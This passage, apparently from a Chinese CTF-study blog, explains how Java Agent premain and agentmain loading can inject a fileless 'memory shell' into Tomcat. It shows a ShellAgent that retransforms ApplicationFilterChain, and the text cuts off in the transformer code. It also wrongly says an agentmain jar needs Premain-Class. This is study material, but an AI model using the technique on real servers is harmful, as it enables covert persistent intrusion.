<p><a class="link"   href="https://blog.csdn.net/as403045314/article/details/101337299" >(55条消息) Glassfish安装、基本使用、在idea中配置Glassfish_as403045314的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>（这文章里面不用全看，就当个下载链接即可，glassfish和tomcat配置方法差不多,我本地跑glassfish会报错，鼓捣了半天，还是报错，先不搞这个了，以后比赛出现 GlassFish 容器再说，我把内存马记一下）</p>
<p>GlassFish 使用 grizzly 组件来完成 NIO 的工作，类似 Tomcat 中的 connector 组件。在 HTTP 下，grizzly 负责解析和序列化 HTTP 请求&#x2F;响应，grizzly 有职责链设计模式的体现，类似Tomcat的Pipeline和Valve，提供了 Filter 和 FilterChain 等接口及实现，就可以被用来写入内存马。</p>
<p>可以采用是通过 <code>HttpServletRequest</code> 最终获取<code>grizzlyRequest</code>，调用其 <code>addAfterServiceListener</code></p>
<p>在 <code>AfterServiceListener</code> 的 <code>onAfterService</code> 中拿到 <code>filterChain</code> 并添加恶意Filter：</p>
<p><a class="link"   href="https://github.com/su18/MemoryShell/commit/38ffaf43782176c47044f588164923c3c5a36b8b#diff-4566c0d4919a1fdefc28876fd5ec7c3a00bd3e86c83526f06085284f82246763" >GlassFish Filter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/su18/MemoryShell/commit/38ffaf43782176c47044f588164923c3c5a36b8b#diff-dd129e104398383810d8bb6b2ae114d349893a803c35baeee0e4c05450b50a17" >GlassFish ServiceList <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="十、Java-Agent-内存马"><a href="#十、Java-Agent-内存马" class="headerlink" title="十、Java Agent 内存马"></a>十、Java Agent 内存马</h2><p><a class="link"   href="http://wjlshare.com/archives/1582" >浅谈 Java Agent 内存马 – 天下大木头 (wjlshare.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Java Agent 支持两种方式进行加载：</p>
<blockquote>
<p>实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）</p>
<p>实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有），主要结合 ClassFileTransformer 接口</p>
</blockquote>
<h3 id="1、java-agent两个加载方式介绍"><a href="#1、java-agent两个加载方式介绍" class="headerlink" title="1、java agent两个加载方式介绍"></a>1、java agent两个加载方式介绍</h3><p>本质是一个jar包中的类，有两种实现，第一种是通过permain()函数实现。这种javaagent会在宿主程序的main函数的启动前启动自己premain函数，这时候会得到一个Instrumentation对象，我们可以通过Instrumentation对象对还未加载的class进行拦截与修改。</p>
<p>还有一种实现方式是利用agentmain()函数。VirtualMachine类的attach(pid)方法可以将当前进程attach到一个运行中的java进程上，接着利用loadAgent(agentJarPath)来将含符合格式且含有agentmain函数的jar包注入到对应的进程，调用loadAgent函数后，对应的进程中会多出一个Instrumentation对象，这个对象会被当作agentmain的一个参数。<br>对应进程接着会调用agentmain函数，进而操作Instrumentation对象，Instrumentation对象可以在class加载前拦截字节码进行修改，也可以对已经加载的class重新让它加载，并拦截且修改其中的内容，跟进程注入差不多，具体做什么操作，取决于我们的jar文件中的agentmain函数怎么写。</p>
<p><strong>Instrumentation 的部分重要方法</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h3 id="2、几个重要的类："><a href="#2、几个重要的类：" class="headerlink" title="2、几个重要的类："></a>2、几个重要的类：</h3><p>Instrumentation对象实现对class的修改操作是依赖于ClassFileTransformer接口中的transform函数。</p>
<p>ClassFileTransformer 对象会被当作参数传给 Instrumentation.addTransformer 函数。此时 Instrumentation.addTransformer  函数其实执行的是其中 ClassFileTransformer 的transform函数。</p>
<h4 id="ClassFileTransformer-接口"><a href="#ClassFileTransformer-接口" class="headerlink" title="ClassFileTransformer 接口"></a><strong>ClassFileTransformer 接口</strong></h4><blockquote>
<p>ClassFileTransformer 接口为转换类文件的代理接口。提供了 <code>transform()</code> 方法用于修改原类的注入。<br>我们可以在获取到 Instrumentation 对象后通过 <code>addTransformer()</code> 方法添加自定义类文件转换器。</p>
</blockquote>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类文件转换方法，重写transform方法可获取到待加载的类相关信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader              定义要转换的类加载器；如果是引导加载器，则为 null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className           类名,如:java/lang/Runtime</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> protectionDomain    要定义或重定义的类的保护域</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回一个通过ASM修改后添加了防御代码的字节码byte数组。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">        <span class="type">byte</span>[] transform(  ClassLoader loader, </span><br><span class="line">                String className,</span><br><span class="line">                Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                ProtectionDomain protectionDomain,</span><br><span class="line">                <span class="type">byte</span>[] classfileBuffer)</span><br><span class="line">        <span class="keyword">throws</span> IllegalClassFormatException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>重写 <code>transform()</code> 方法需要注意以下事项：</strong></p>
<ol>
<li>ClassLoader 如果是被 Bootstrap ClassLoader (引导类加载器)所加载那么 loader 参数的值是空。</li>
<li>修改类字节码时需要特别注意插入的代码在对应的 ClassLoader 中可以正确的获取到，否则会报 ClassNotFoundException ，比如修改 java.io.FileInputStream (该类由 Bootstrap ClassLoader 加载)时插入了我们检测代码，那么我们将必须保证 FileInputStream 能够获取到我们的检测代码类。</li>
<li>JVM类名的书写方式路径方式：<code>java/lang/String</code> 而不是我们常用的类名方式：<code>java.lang.String</code>。</li>
<li>类字节必须符合 JVM 校验要求，如果无法验证类字节码会导致 JVM 崩溃或者 VerifyError (类验证错误)。</li>
<li>如果修改的是 retransform 类(修改已被 JVM 加载的类)，修改后的类字节码不得新增方法、修改方法参数、类成员变量。</li>
<li><code>addTransformer</code> 时如果没有传入 retransform 参数(默认是 false )，就算 MANIFEST.MF 中配置了 <code>Can-Redefine-Classes: true</code> 而且手动调用了<code>retransformClasses()</code>方法也一样无法retransform。</li>
<li>卸载 transform 时需要使用创建时的 Instrumentation 实例。</li>
</ol>
<p><strong>还需要理解的是，在以下三种情形下 <code>ClassFileTransformer.transform()</code> 会被执行：</strong></p>
<ol>
<li>新的 class 被加载。</li>
<li><code>Instrumentation.redefineClasses</code> 显式调用。</li>
<li><code>addTransformer</code> 第二个参数为 true 时，<code>Instrumentation.retransformClasses</code> 显式调用。</li>
</ol>
<h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">VirtualMachine</span> &#123;</span><br><span class="line">    <span class="comment">// 获得当前所有的JVM列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;VirtualMachineDescriptor&gt; <span class="title function_">list</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据pid连接到JVM</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> VirtualMachine <span class="title function_">attach</span><span class="params">(String id)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 断开连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">detach</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载agent，agentmain方法靠的就是这个方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">loadAgent</span><span class="params">(String agent)</span> &#123; ... &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><p>可以理解成加强版的Method对象。</p>
<p>获得方法：CtMethod m &#x3D; cc.getDeclaredMethod(MethodName)。</p>
<p>这个类提供了一些方法，使我们可以便捷的修改方法体：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="3、启动时加载-agent——premain"><a href="#3、启动时加载-agent——premain" class="headerlink" title="3、启动时加载 agent——premain"></a>3、启动时加载 agent——premain</h3><p><strong>——利用premain函数实现java agent</strong></p>
<p>Javaagent 是 java 命令的一个参数。参数 javaagent 可以用于指定一个 jar 包，并且对该 java 包有2个要求：</p>
<blockquote>
<ul>
<li>这个 jar 包的 MANIFEST.MF 文件必须指定 Premain-Class 项。</li>
<li>Premain-Class 指定的那个类必须实现 premain() 方法。</li>
</ul>
</blockquote>
<p>拦截到的class文件会被转化为字节码，然后传给premain函数，premain函数中可以调用Instrumentation类中的函数对刚刚传送进来的字节码进行操作。等到操作结束会将字节码给jvm加载。</p>
<blockquote>
<p>( premain 方法顾名思义，会在我们运行 main 方法之前进行调用，即在运行 main 方法之前会先去调用我们 jar 包中 Premain-Class 类中的 premain 方法)</p>
</blockquote>
<p>且 <code>premain</code> 函数格式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void premain(String agentArgs, Instrumentation inst)</span><br></pre></td></tr></table></figure></div>



<h4 id="小demo尝试"><a href="#小demo尝试" class="headerlink" title="小demo尝试"></a>小demo尝试</h4><p><strong>1.创建一个类，需要实现premain方法</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Java_Agent.premain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">premainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(agentArgs);</span><br><span class="line">        System.out.println(<span class="string">&quot;koishi 的 premaindemo 来喽&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>2.接下来创建 mainfest，这里将其保存为 agent.mf ，一定要含有 Premain-Class 属性</strong></p>
<p>（ps：注意这里的 mf 一定要有空行）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: premainDemo</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>**3.利用 javac 将 java 文件编译成 class 之后，利用 jar 命令打包，生成我们的 agent.jar **</p>
<p><strong><font color="red">(打class的时候 java 文件一定一定不要带上package信息，不然会出现找不到类的报错)</font></strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac .\premainDemo_Say.java</span><br><span class="line">jar cvfm agent.jar cirno.mf .\premainDemo_Say.class</span><br></pre></td></tr></table></figure></div>



<p><strong>4.然后创建一个普通类作为测试 demo</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Java_Agent.premain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiNice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>Ilyn.mf</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: KoishiNice</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>同样的利用 javac 编译之后打包成 Ilyn.jar</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac .\KoishiNice.java</span><br><span class="line">jar cvfm Ilyn.jar Ilyn.mf .\KoishiNice.class</span><br></pre></td></tr></table></figure></div>

<p>最终得到了 agent.jar 和  Ilyn.jar</p>
<p>接下来我们只需要在 <code>java -jar</code> 中添加 <code>-javaagent:agent.jar</code> 即可在启动时优先加载 agent , 而且可利用如下方式获取传入我们的 agentArgs 参数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -javaagent:agent.jar[=options] -jar Ilyn.jar</span><br></pre></td></tr></table></figure></div>

<p>测试看看</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -javaagent:agent.jar=&quot;Please be careful, because Koishi is looking at you&quot; -jar Ilyn.jar</span><br></pre></td></tr></table></figure></div>





<h4 id="动态修改字节码"><a href="#动态修改字节码" class="headerlink" title="动态修改字节码"></a>动态修改字节码</h4><p>在demo处，我们可以发现，在实现 premain 的时候，我们除了能获取到 agentArgs 参数，还可以获取 Instrumentation 实例，复习一下</p>
<p><strong><font color="brown">Instrumentation</font></strong></p>
<p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果</p>
<p>在 Instrumentation 中增加了名叫 transformer 的 Class 文件转换器，转换器可以改变二进制流的数据。Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码。上文介绍的 transform 的注意点也别忘了。再把几个方法粘一下。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>Instrumentation 提供了 addTransformer，getAllLoadedClasses，retransformClasses 等方法，我们后面由于只用到了这三个所以就只介绍这三个</p>
<h5 id="addTransformer"><a href="#addTransformer" class="headerlink" title="addTransformer"></a><font color="deeppink">addTransformer</font></h5><p>addTransformer 方法来用于注册 Transformer，所以我们可以通过编写 ClassFileTransformer 接口的实现类来注册我们自己的转换器</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册提供的转换器</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span><br></pre></td></tr></table></figure></div>

<p>这样当类加载的时候，会进入我们自己的 Transformer 中的 transform 函数进行拦截（自己写Transformer 需要实现 ClassFileTransformer 接口）</p>
<p><strong>注意</strong>：如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MANIFEST.MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Can-Retransform-Classes 是否支持类的重新替换</span><br><span class="line">Can-Redefine-Classes 是否支持类的重新定义</span><br></pre></td></tr></table></figure></div>

<p>这两个如果不添加的话，当我们执行的时候是会报错的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar cvfm koishi.jar koishi.mf .\KoishiPremain.class;jar cvfm cirno.jar cirno.mf .\KoishiSay.class</span><br><span class="line">java -javaagent:koishi.jar=&quot;test&quot; -jar cirno.jar</span><br></pre></td></tr></table></figure></div>

<p>这里加载class我忘了去package，而且javac还找不到类，源码中的class和jar我都删了，有兴趣可以再去搞一个试试，我累了，这东西还挺麻烦的。原理和上面那个差不多，只不过多了一个transform修改源码逻辑。（后面有空了重新补上）</p>
<h3 id="4、启动后加载-agent——agentmain"><a href="#4、启动后加载-agent——agentmain" class="headerlink" title="4、启动后加载 agent——agentmain"></a>4、启动后加载 agent——agentmain</h3><p><strong>执行逻辑</strong></p>
<blockquote>
<ol>
<li>确定要attach到哪个jvm进程中</li>
<li>使用id函数确定jvm进程的pid</li>
<li>使用attach(pid)函数链接这个jvm进程</li>
<li>使用loadAgent将我们的恶意agent.jar包添加进jvm进程中</li>
<li>jvm进程会生成一个instrumentation对象并传到agent.jar包中指定类的agentmain函数中当作参数。</li>
<li>agentmain函数执行。</li>
</ol>
</blockquote>
<p><code>VirtualMachine.list()</code>方法会去寻找当前系统中所有运行着的JVM进程，你可以打印<code>displayName()</code>看到当前系统都有哪些JVM进程在运行。因为main函数执行起来的时候<code>进程名为当前类名</code>，所以通过这种方式可以去找到当前的进程id。</p>
<p>和之前的 premain 函数一样，我们可以编写 agentmain 函数的 Java 类 </p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs, Instrumentation inst)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs)</span></span><br></pre></td></tr></table></figure></div>

<p>要求和之前类似，我们需要满足以下条件</p>
<blockquote>
<ol>
<li>必须要实现 agentmain 方法</li>
<li>Jar 文件清单中必须要含有 Premain-Class 属性</li>
</ol>
</blockquote>
<p>在 Java JDK6 以后实现启动后加载 Instrument 的是 Attach api。存在于 com.sun.tools.attach 里面有两个重要的类。</p>
<p>来查看一下该包中的内容，这里有两个比较重要的类，分别是 VirtualMachine 和 VirtualMachineDescriptor，其中我们重点关注 VirtualMachine 类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\20210614163630.png"
                      alt="image-20210614163630025"
                ></p>
<h4 id="VirtualMachine-1"><a href="#VirtualMachine-1" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p><code>VirtualMachine</code> 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法<code>LoadAgent</code>，<code>Attach</code> 和 <code>Detach</code> 。下面来看看这几个方法的作用</p>
<p><strong>Attach</strong> ：该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br></pre></td></tr></table></figure></div>

<p><strong>loadAgent</strong>：向<code>jvm</code>注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用<code>ClassFileTransformer</code>接口中提供的方法进行处理。</p>
<p><strong>Detach</strong>：从 <code>JVM</code> 上面解除一个代理(agent)</p>
<h4 id="VirtualMachineDescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h4><p>VirtualMachineDescriptor 是一个描述虚拟机的容器类，配合 VirtualMachine 类完成各种功能。</p>
<p>所以最后我们的注入流程大致如下：</p>
<blockquote>
<p>通过 VirtualMachine 类的 attach(pid) 方法，可以 attach 到一个运行中的 java 进程上，之后便可以通过 loadAgent(agentJarPath) 来将agent 的 jar 包注入到对应的进程，然后对应的进程会调用agentmain方法。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\20210614164445.png"
                      alt="image-20210614164444958"
                ></p>
<h4 id="Demo（详情见源码）"><a href="#Demo（详情见源码）" class="headerlink" title="Demo（详情见源码）"></a>Demo（详情见源码）</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar cvfm AgentMain.jar koishiagent.mf KoishiAgent.class KoishiTransformer.class </span><br></pre></td></tr></table></figure></div>

<p>windows下需要将 jdk 的 tools.jar 自行添加到项目依赖，才能进行后续操作，不然会报错。</p>
<p>详情见项目源码</p>
<h4 id="agentmain-内存马"><a href="#agentmain-内存马" class="headerlink" title="agentmain 内存马"></a>agentmain 内存马</h4><p><a class="link"   href="https://github.com/KpLi0rn/AgentMemShell" >KpLi0rn&#x2F;AgentMemShell: JavaAgent内存马 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>其他师傅写好的测试项目</p>
<p>配合 Filter 的 <code>ApplicationFilterChain#doFilter</code>里面封装了用户请求的 request 和 response，我们能够注入，直接获取用户的请求，将执行结果写在 response 中进行返回</p>
<p><strong>ShellAgent.java</strong></p>
<p>首先注册我们的 DefineTransformer ，然后遍历已加载的 class，如果存在的话那么就调用 retransformClasses 对其进行重定义</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro.vuln.Java_Agent.agantmain.AgentShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellAgent</span> &#123;</span><br><span class="line">    <span class="comment">// 将目标类设置为我们最喜欢的 ApplicationFilterChain</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<p><strong>CirnoTransformer.java</strong></p>
<p>对 transform 拦截的类进行 if 判断，如果被拦截的 classname 等于 ApplicationFilterChain 的话那么就对其进行字节码动态修改</p>
<p>这里利用 insertBefore ，将其插入到前面，从而减少对原程序的功能破坏</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CirnoTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span 